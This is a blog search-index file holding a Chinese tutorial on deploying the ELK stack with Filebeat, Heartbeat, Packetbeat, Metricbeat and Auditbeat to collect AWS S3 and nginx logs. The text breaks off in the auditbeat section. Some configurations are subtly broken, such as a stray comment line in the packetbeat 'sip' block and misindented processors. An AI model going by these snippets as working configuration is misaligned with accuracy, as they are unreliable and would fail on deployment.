<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ELK基础搭建</title>
      <link href="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ELK初步搭建"><a href="#ELK初步搭建" class="headerlink" title="ELK初步搭建"></a>ELK初步搭建</h1><p><strong>搭建elasticserach、kibana、logstash和beats，导入存储在aws s3中的日志</strong></p><p><strong>准备工作</strong>：</p><p>1、准备四台服务器（在四台机子上分别部署这elk+beats）</p><p>centos8系统</p><p>都安装了java11</p><p>第四台机子安装nginx网站</p><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> yum install java-<span class="number">11</span>-openjdk.x<span class="number">86</span>_<span class="number">64</span></span><br></pre></td></tr></tbody></table></figure><p>2、从官网下载安装包或yum安装（yum安装官网有教程）</p><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.10/rpm.html#rpm-repo">elasticserach</a></p><p><a href="https://www.elastic.co/guide/en/kibana/7.10/rpm.html#rpm-repo">kibana</a></p><p><a href="https://www.elastic.co/guide/en/logstash/7.10/installing-logstash.html#_yum">logstash</a></p><p>举个elastic例子：</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">rpm --import https:<span class="regexp">//</span>artifacts.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line"></span><br><span class="line">sudo vi <span class="regexp">/etc/yum</span>.repos.d/elastic.repo</span><br></pre></td></tr></tbody></table></figure><p>以下是文本内容</p><figure class="highlight ini"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">[elastic-7.x]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name</span>=Elastic repository for <span class="number">7</span>.x packages</span><br><span class="line"></span><br><span class="line"><span class="attr">baseurl</span>=https://artifacts.elastic.co/packages/<span class="number">7</span>.x/yum</span><br><span class="line"></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">gpgkey</span>=https://artifacts.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line"></span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">autorefresh</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">type</span>=rpm-md</span><br></pre></td></tr></tbody></table></figure><p>然后安装</p><figure class="highlight cmake"><table><tbody><tr><td class="code"><pre><span class="line">sudo yum <span class="keyword">install</span> elasticsearch</span><br></pre></td></tr></tbody></table></figure><p>yum有可能网络不稳定时间过久</p><p>采用rpm包安装</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line">rpm -ivh 安装包<span class="string">.rpm</span></span><br></pre></td></tr></tbody></table></figure><h2 id="一、elasticsearch配置"><a href="#一、elasticsearch配置" class="headerlink" title="一、elasticsearch配置"></a>一、elasticsearch配置</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo su <span class="comment"># 本人习惯直接root用户</span></span><br><span class="line">systemctl <span class="built_in">enable</span> elasticsearch</span><br></pre></td></tr></tbody></table></figure><p>修改配置文件</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>elasticsearch/elasticsearch.yml</span><br></pre></td></tr></tbody></table></figure><p>配置文件内容</p><figure class="highlight vala"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#节点名字</span></span><br><span class="line">node.name: example  </span><br><span class="line"><span class="meta">#elastic自身日志路径</span></span><br><span class="line">path.logs: /<span class="keyword">var</span>/log/elasticsearch  </span><br><span class="line"><span class="meta">#数据存储的路径，要存储日志较多，所以我选择了自己挂载1T硬盘的路径</span></span><br><span class="line">path.data: /mnt/example </span><br><span class="line"><span class="meta">#允许访问的ip，根据需求设置  </span></span><br><span class="line">network.host: <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="meta">#elastic的访问端口，根据需求修改  </span></span><br><span class="line">http.port: <span class="number">9200</span> </span><br><span class="line"><span class="meta">#因为是单机，就设置本机为主节点     </span></span><br><span class="line">cluster.initial_master_nodes: [<span class="string">"example"</span>]  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#开启xpack基础功能，可以启用用户密码访问功能</span></span><br><span class="line">xpack.security.enabled: <span class="literal">true</span></span><br><span class="line"><span class="meta">#如果elk建在一台机子上，可以不开启，我分开搭建，所以必须开启         </span></span><br><span class="line">xpack.security.transport.ssl.enabled: <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>设置密码</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cd <span class="regexp">/usr/</span>share<span class="regexp">/elasticsearch/</span></span><br><span class="line"></span><br><span class="line">/elasticsearch-setup-passwords interactive</span><br></pre></td></tr></tbody></table></figure><p>然后依次设置密码（elastic用户密码很多地方都要用到）</p><h2 id="二、kibana配置"><a href="#二、kibana配置" class="headerlink" title="二、kibana配置"></a>二、kibana配置</h2><p>sudo su</p><p><strong>密文配置</strong></p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/kibana/</span>bin/kibana-keystore --allow-root create</span><br><span class="line"></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/kibana/</span>bin/kibana-keystore --allow-root add elastic</span><br><span class="line"></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/kibana/</span>bin/kibana-keystore --allow-root add 对应的密码</span><br></pre></td></tr></tbody></table></figure><p>修改配置文件</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>kibana/kibana.yml</span><br></pre></td></tr></tbody></table></figure><p> 配置文件内容</p><figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">server<span class="selector-class">.port</span>: <span class="number">5601</span></span><br><span class="line">server<span class="selector-class">.host</span>: <span class="string">"0.0.0.0"</span></span><br><span class="line">server<span class="selector-class">.name</span>: <span class="string">"服务器名"</span></span><br><span class="line">elasticsearch<span class="selector-class">.hosts</span>: <span class="selector-attr">[<span class="string">"ip:port"</span>]</span></span><br><span class="line">xpack<span class="selector-class">.reporting</span><span class="selector-class">.encryptionKey</span>: <span class="string">"a_random_string"</span></span><br><span class="line">xpack<span class="selector-class">.security</span><span class="selector-class">.encryptionKey</span>: <span class="string">"something_at_least_32_characters"</span></span><br><span class="line">i18n<span class="selector-class">.locale</span>: <span class="string">"zh-CN"</span></span><br></pre></td></tr></tbody></table></figure><p>明文配置要加入</p><figure class="highlight avrasm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">elasticsearch.username:</span> <span class="string">"elastic"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">elasticsearch.password:</span> <span class="string">"密码"</span></span><br></pre></td></tr></tbody></table></figure><p>进行密文设置后，会多出个安全的功能，可以添加相应的用户和权限。</p><p> 创建好后，kibana和elastic都要账户密码登入</p><p><img src="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/646812b79da9f5b8752e8ea66efe8253.png" alt="646812b79da9f5b8752e8ea66efe8253.png"></p><h2 id="三、logstash配置"><a href="#三、logstash配置" class="headerlink" title="三、logstash配置"></a>三、logstash配置</h2><p>1、导入s3的logstash配置文件</p><p>修改配置文件</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>logstash<span class="regexp">/conf.d/</span>aws.conf</span><br></pre></td></tr></tbody></table></figure><p>配置文件内容</p><p>s3 input配置参考了相应的博客，在aws s3的页面创建读存储区域的用户，并将信息对应填入</p><p><a href="https://geektechstuff.com/2020/07/17/aws-using-logstash-to-ingest-logs-from-s3-bucket-into-elastic/">https://geektechstuff.com/2020/07/17/aws-using-logstash-to-ingest-logs-from-s3-bucket-into-elastic/</a></p><p>由于日志为json格式，所以用了json插件</p><p>geoip地图插件，可以在kibana里创建地图（索引名字我在output中用logstash开头，可以使用logstash模板，就能用地图了）</p><p>date时间插件，自己修改后在导入就日志是会自动匹配到对应日志生成的时间,替换自动生成的@timestap的默认服务器时间</p><p>这些官方文档里都有介绍</p><p><a href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-geoip.html">https://www.elastic.co/guide/en/logstash/current/plugins-filters-geoip.html</a></p><p><a href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-date.html">https://www.elastic.co/guide/en/logstash/current/plugins-filters-date.html</a></p><figure class="highlight puppet"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">input</span> {</span><br><span class="line">      s3 {</span><br><span class="line">        <span class="string">"access_key_id"</span> =&gt; <span class="string">""</span></span><br><span class="line">        <span class="string">"secret_access_key"</span> =&gt; <span class="string">""</span></span><br><span class="line">        <span class="string">"bucket"</span> =&gt; <span class="string">""</span></span><br><span class="line">        <span class="string">"region"</span> =&gt; <span class="string">""</span>  </span><br><span class="line">        <span class="string">"prefix"</span> =&gt; <span class="string">""</span> </span><br><span class="line">        <span class="string">"additional_settings"</span> =&gt; {</span><br><span class="line">          <span class="string">"force_path_style"</span> =&gt; <span class="keyword">true</span></span><br><span class="line">          <span class="string">"follow_redirects"</span> =&gt; <span class="keyword">false</span></span><br><span class="line">        }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">filter</span> {</span><br><span class="line">    json {</span><br><span class="line">        <span class="attr">source</span> =&gt; <span class="string">"message"</span>  </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">geoip</span> {</span><br><span class="line">       <span class="attr">source</span> =&gt; <span class="string">"ClientIP"</span></span><br><span class="line">       <span class="attr">target</span> =&gt; <span class="string">"geoip"</span></span><br><span class="line">       <span class="attr">add_field</span> =&gt; [ <span class="string">"[geoip][coordinates]"</span>, <span class="string">"%{[geoip][longitude]}"</span> ]</span><br><span class="line">       <span class="attr">add_field</span> =&gt; [ <span class="string">"[geoip][coordinates]"</span>, <span class="string">"%{[geoip][latitude]}"</span>  ]</span><br><span class="line">                }</span><br><span class="line">      <span class="keyword">mutate</span> {</span><br><span class="line">                        <span class="attr">convert</span> =&gt; [ <span class="string">"[geoip][coordinates]"</span>, <span class="string">"float"</span>]</span><br><span class="line">                 }</span><br><span class="line">      <span class="keyword">date</span> {</span><br><span class="line">        <span class="attr">match</span> =&gt; [<span class="string">"EdgeStartTimestamp"</span>, <span class="string">"MMM  d HH:mm:ss"</span>, <span class="string">"MMM dd HH:mm:ss"</span>, <span class="string">"ISO8601"</span>]</span><br><span class="line">        <span class="attr">target</span> =&gt; <span class="string">"@timestamp"</span></span><br><span class="line">       }      </span><br><span class="line">}</span><br><span class="line"><span class="keyword">output</span> {</span><br><span class="line">elasticsearch {</span><br><span class="line">      <span class="attr">hosts</span> =&gt; [<span class="string">"ip:port"</span>]</span><br><span class="line">      <span class="attr">index</span> =&gt; <span class="string">"logstash-%{+YYYY.MM.dd}"</span></span><br><span class="line">      <span class="attr">user</span> =&gt; <span class="string">"elastic"</span></span><br><span class="line">      <span class="attr">password</span> =&gt; <span class="string">"elastic密码"</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>2、导入nginx日志的配置文件</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>logstash<span class="regexp">/conf.d/</span>nginx.conf</span><br></pre></td></tr></tbody></table></figure><p>nginx的配置文件</p><figure class="highlight inform7"><table><tbody><tr><td class="code"><pre><span class="line">input {</span><br><span class="line">  beats {</span><br><span class="line">   port =&gt; 5044</span><br><span class="line">   host =&gt; <span class="string">"0.0.0.0"</span></span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line">filter {</span><br><span class="line">  if <span class="string">"nginx_access"</span> in <span class="comment">[tags]</span> {</span><br><span class="line">    grok {</span><br><span class="line">    match =&gt; { <span class="string">"message"</span> =&gt; <span class="comment">["%{IPORHOST:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[remote_ip]</span>}%{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[host]</span>}\ - \<span class="comment">[%{HTTPDATE:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[time]</span>}\]</span> \"%{WORD:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[method]</span>} %{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[url]</span>} HTTP/%{NUMBER:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[http_version]</span>}\" %{NUMBER:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[response_code]</span>} %{NUMBER:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[body_sent]</span><span class="comment">[bytes]</span>} \"%{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[referrer]</span>}\" \"%{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[agent]</span>}\""]</span> }</span><br><span class="line">    }</span><br><span class="line">        }</span><br><span class="line">    if <span class="string">"nginx_error"</span> in <span class="comment">[tags]</span> {</span><br><span class="line">    grok {</span><br><span class="line">    match =&gt; { <span class="string">"message"</span> =&gt; <span class="comment">["%{IPORHOST:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[remote_ip]</span>}%{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[host]</span>}\ - \<span class="comment">[%{HTTPDATE:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[time]</span>}\]</span> \"%{WORD:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[method]</span>} %{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[url]</span>} HTTP/%{NUMBER:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[http_version]</span>}\" %{NUMBER:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[response_code]</span>} %{NUMBER:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[body_sent]</span><span class="comment">[bytes]</span>} \"%{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[referrer]</span>}</span></span><br><span class="line"><span class="comment">\" \"%{DATA:<span class="comment">[nginx]</span><span class="comment">[access]</span><span class="comment">[agent]</span>}\""]</span> }</span><br><span class="line">    }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line">output {</span><br><span class="line">   if <span class="string">"nginx_access"</span> in <span class="comment">[tags]</span>{</span><br><span class="line">      elasticsearch {</span><br><span class="line">         hosts =&gt; <span class="comment">["ip:port"]</span></span><br><span class="line">         user =&gt; <span class="string">"elastic"</span></span><br><span class="line">         password =&gt; <span class="string">"密码"</span></span><br><span class="line">         index =&gt; <span class="string">"3nginx-access-logstash-%{+YYYY.MM.dd}"</span></span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">   if <span class="string">"nginx_error"</span> in <span class="comment">[tags]</span>{</span><br><span class="line">      elasticsearch {</span><br><span class="line">        hosts =&gt; <span class="comment">["ip:port"]</span></span><br><span class="line">        user =&gt; <span class="string">"elastic"</span></span><br><span class="line">        password =&gt; <span class="string">"密码"</span></span><br><span class="line">        index =&gt; <span class="string">"3nginx-error-logstash-%{+YYYY.MM.dd}"</span></span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="四、beats配置"><a href="#四、beats配置" class="headerlink" title="四、beats配置"></a>四、beats配置</h2><p> filebeat=&gt;logstash导入nginx的日志</p><ol><li>filebeat</li></ol><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>filebeat/filebeat.yml</span><br></pre></td></tr></tbody></table></figure><p>配置文件</p><figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">filebeat.<span class="built_in">input</span><span class="variable">s:</span></span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span></span><br><span class="line">  enabled: true</span><br><span class="line">  path<span class="variable">s:</span></span><br><span class="line">    - /var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br><span class="line">  <span class="keyword">tag</span><span class="variable">s:</span> [<span class="string">"nginx_access"</span>]</span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span></span><br><span class="line">  enabled: true</span><br><span class="line">  path<span class="variable">s:</span></span><br><span class="line">    - /var/<span class="built_in">log</span>/nginx/error.<span class="built_in">log</span></span><br><span class="line">  <span class="keyword">tag</span><span class="variable">s:</span> [<span class="string">"nginx_error"</span>]</span><br><span class="line"></span><br><span class="line">output.logstash:</span><br><span class="line">  host<span class="variable">s:</span> [<span class="string">"ip:port"</span>]</span><br></pre></td></tr></tbody></table></figure><p>其它beats=&gt;elasticsearch导入</p><p>修改对应的配置文件</p><p>参考：<a href="https://www.cnblogs.com/llwxhn/category/1663454.html">https://www.cnblogs.com/llwxhn/category/1663454.html</a></p><h3 id="1、Heartbeat"><a href="#1、Heartbeat" class="headerlink" title="1、Heartbeat"></a>1、Heartbeat</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>heartbeat/heartbeat.yml</span><br></pre></td></tr></tbody></table></figure><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">heartbeat.config.monitors:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">${path.config}/monitors.d/*.yml</span></span><br><span class="line">  <span class="attr">reload.enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">reload.period:</span> <span class="string">5s</span></span><br><span class="line"></span><br><span class="line"><span class="attr">heartbeat.monitors:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">  <span class="attr">id:</span> <span class="string">my-monitor</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">My</span> <span class="string">Monitor</span></span><br><span class="line">  <span class="attr">urls:</span> [<span class="string">"url"</span>]</span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">'@every 10s'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">setup.template.settings:</span></span><br><span class="line"><span class="attr">index.number_of_shards:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">index.codec:</span> <span class="string">best_compression</span></span><br><span class="line"><span class="attr">setup.kibana:</span></span><br><span class="line"><span class="attr">host:</span> <span class="string">"ip:port"</span></span><br><span class="line"><span class="attr">output.elasticsearch:</span></span><br><span class="line"><span class="attr">hosts:</span> [<span class="string">"ip:port"</span>]</span><br><span class="line"><span class="attr">username:</span> <span class="string">"elastic"</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">"密码"</span></span><br></pre></td></tr></tbody></table></figure><h3 id="2、Packbeat"><a href="#2、Packbeat" class="headerlink" title="2、Packbeat"></a>2、Packbeat</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>packetbeat/packetbeat.yml</span><br></pre></td></tr></tbody></table></figure><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">packetbeat.interfaces.device:</span> <span class="string">any</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">packetbeat.flows:</span></span><br><span class="line">  <span class="comment"># Set network flow timeout. Flow is killed if no packet is received before being</span></span><br><span class="line">  <span class="comment"># timed out.</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="string">30s</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Configure reporting period. If set to -1, only killed flows will be reported</span></span><br><span class="line">  <span class="attr">period:</span> <span class="string">10s</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">packetbeat.protocols:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">icmp</span></span><br><span class="line">  <span class="comment"># Enable ICMPv4 and ICMPv6 monitoring. Default: false</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">amqp</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for AMQP traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the AMQP protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">5672</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">cassandra</span></span><br><span class="line">  <span class="comment">#Cassandra port for traffic monitoring.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">9042</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dhcpv4</span></span><br><span class="line">  <span class="comment"># Configure the DHCP for IPv4 ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">67</span>, <span class="number">68</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dns</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for DNS traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the DNS protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">53</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for HTTP traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the HTTP protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">80</span>, <span class="number">8080</span>, <span class="number">8000</span>, <span class="number">5000</span>, <span class="number">8002</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">memcache</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for memcache traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the Memcache protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">11211</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">mysql</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for MySQL traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the MySQL protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">3306</span>,<span class="number">3307</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">pgsql</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for Pgsql traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the Pgsql protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">5432</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">redis</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for Redis traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the Redis protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">6379</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">thrift</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for Thrift-RPC traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the Thrift-RPC protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">9090</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">mongodb</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for MongoDB traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the MongoDB protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">27017</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">nfs</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for NFS traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the NFS protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">2049</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">tls</span></span><br><span class="line">  <span class="comment"># Configure the ports where to listen for TLS traffic. You can disable</span></span><br><span class="line">  <span class="comment"># the TLS protocol by commenting out the list of ports.</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">443</span>   <span class="comment"># HTTPS</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">993</span>   <span class="comment"># IMAPS</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">995</span>   <span class="comment"># POP3S</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">5223</span>  <span class="comment"># XMPP over SSL</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">8443</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">8883</span>  <span class="comment"># Secure MQTT</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">9243</span>  <span class="comment"># Elasticsearch</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">sip</span></span><br><span class="line"><span class="string">protocol</span> <span class="string">by</span> <span class="string">commenting</span> <span class="string">out</span> <span class="string">the</span> <span class="string">list</span> <span class="string">of</span> <span class="string">ports.</span></span><br><span class="line">  <span class="attr">ports:</span> [<span class="number">5060</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">setup.template.settings:</span></span><br><span class="line">  <span class="attr">index.number_of_shards:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">setup.kibana:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">"ip:port"</span></span><br><span class="line"><span class="attr">output.elasticsearch:</span></span><br><span class="line">  <span class="attr">hosts:</span> [<span class="string">"IP:port"</span>]</span><br><span class="line">  <span class="attr">username:</span> <span class="string">"elastic"</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">"密码"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">processors:</span></span><br><span class="line">    <span class="attr">if.contains.tags:</span> <span class="string">forwarded</span></span><br><span class="line">    <span class="attr">then:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">drop_fields:</span></span><br><span class="line">          <span class="attr">fields:</span> [<span class="string">host</span>]</span><br><span class="line">    <span class="attr">else:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">add_host_metadata:</span> <span class="string">~</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_cloud_metadata:</span> <span class="string">~</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_docker_metadata:</span> <span class="string">~</span></span><br></pre></td></tr></tbody></table></figure><p>metricbeat</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/m</span>etricbeat/metricbeat.yml</span><br></pre></td></tr></tbody></table></figure><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">metricbeat.config.modules:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">${path.config}/modules.d/*.yml</span></span><br><span class="line">  <span class="attr">reload.enabled:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">setup.template.settings:</span></span><br><span class="line">  <span class="attr">index.number_of_shards:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">index.codec:</span> <span class="string">best_compression</span></span><br><span class="line"><span class="attr">setup.kibana:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">"ip:port"</span></span><br><span class="line"><span class="attr">output.elasticsearch:</span></span><br><span class="line">  <span class="attr">hosts:</span> [<span class="string">"ip:port"</span>]</span><br><span class="line">  <span class="attr">username:</span> <span class="string">"elastic"</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">"密码"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">processors:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_host_metadata:</span> <span class="string">~</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_cloud_metadata:</span> <span class="string">~</span></span><br></pre></td></tr></tbody></table></figure><h3 id="auditbeat"><a href="#auditbeat" class="headerlink" title="auditbeat"></a>auditbeat</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>auditbeat/auditbeat.yml</span><br></pre></td></tr></tbody></table></figure><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">auditbeat.modules:</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">module:</span> <span class="string">auditd</span></span><br><span class="line">  <span class="attr">audit_rule_files:</span> [ <span class="string">'${path.config}/audit.rules.d/*.conf'</span> ]</span><br><span class="line">  <span class="attr">audit_rules:</span> <span class="string">|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">module:</span> <span class="string">file_integrity</span></span><br><span class="line">  <span class="attr">paths:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/bin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/usr/bin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/sbin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/usr/sbin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/etc</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">module:</span> <span 